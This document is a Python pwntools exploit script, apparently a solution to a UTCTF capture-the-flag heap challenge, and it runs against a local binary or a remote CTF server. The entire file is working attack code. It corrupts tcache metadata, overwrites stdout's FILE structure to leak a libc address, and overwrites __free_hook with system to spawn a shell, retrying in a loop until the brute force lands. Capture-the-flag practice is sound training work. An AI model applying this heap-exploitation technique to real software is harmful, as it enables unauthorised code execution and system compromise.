from pwn import *
import random

e = ELF("./pwnable")
libc = ELF("./libc.so.6")

context.binary = e.path

def do():

  if "--remote" in sys.argv:
    p = remote("binary.utctf.live", 9050)
  else:
    print(libc)
    p = process(e.path, env={"LD_PRELOAD": libc.path})

  def alloc(idx, size, desc="AAAA", name="AAAA", eatAll=True):
    p.sendline("1")
    p.sendlineafter("Index:", str(idx))
    p.sendlineafter(":", name)
    p.sendlineafter(":", str(size))
    p.sendafter(":", desc)
    
    if eatAll:
      p.recvuntil(">")

  def free(idx, eatAll=True):
    p.sendline("2")
    p.recvuntil("cancel?")
    p.sendlineafter("Index:", str(idx))
    
    if eatAll:
      p.recvuntil(">")

  p.recvuntil(">")

  alloc(1, 0x20)
  alloc(2, 0x10)
  alloc(3, 0x20)
  alloc(0, 0x500)

  alloc(4, 0x20)

  free(0)

  free(1)
  alloc(1, 0x28, "\x00" * 0x28 + "\xf1")
  free(1)
  free(3)

  free(2)
  alloc(2, 0xe8, "\x00" * 0x18 + p64(0x31) + "\xe0")

  alloc(5, 0x50, "\x60" + chr(7 + 0x10 * random.randint(0, 0xf)))
  alloc(7, 0x20)
  alloc(6, 0x20)
  alloc(6, 0x28, p64(0xfbad1800) + p64(0) + p64(0) + p64(0) + "\x00", eatAll=False)

  p.recv(0x18)
  p.recv(8)
  leak = u64(p.recv(8)) - 0x1555553288b0 + 0x0000155554f3b000
  print(hex(leak))

  if leak % 0x100 == 0xad:
    return

  free(2, eatAll=False)
  alloc(2, 0xe8, "\x00" * 0x18 + p64(0x41) + "\n", eatAll=False)

  free(7, eatAll=False)
  free(2, eatAll=False)
  alloc(2, 0xe8, "\x00" * 0x18 + p64(0x41) + p64(leak + libc.symbols["__free_hook"] - 8) + "\n", eatAll=False)
  alloc(2, 0x30, "AAAA\n", eatAll=False)
  alloc(2, 0x30, "/bin/sh\x00" + p64(leak + libc.symbols["system"]) + "\n", eatAll=False)

  free(2, False)

  p.sendline("echo asdf")
  p.recvuntil("asdf")

  p.interactive()

while True:
  try:
    do()
  except EOFError as e:
    print(str(e))
    pass
